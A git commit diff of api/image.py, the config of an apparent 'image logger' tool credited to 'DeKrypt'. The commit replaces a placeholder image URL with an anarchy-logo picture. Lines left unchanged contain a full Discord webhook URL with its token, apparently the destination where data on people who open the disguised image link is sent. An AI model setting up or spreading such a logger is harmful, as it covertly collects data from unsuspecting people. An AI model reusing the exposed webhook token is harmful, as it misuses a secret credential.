e44f0066b5bb7429a8d5e64b8ca9639e9ceae7c7
zeinkoax <efebaygeldi571@gmail.com>
2025-01-31 06:49:27 +0300

    image.py

--- api/image.py
+++ api/image.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1334725726196207676/-aJr8AXeQGaoA2QYpRibXS0qaBQuki84-XdlkQ9P2pA4i6tD2nxVPRaSO_NJD1wHkxCo",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "image": "https://w7.pngwing.com/pngs/919/558/png-transparent-drawing-anarchy-logo-anarchy-bicycle-part-anarchism-line.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
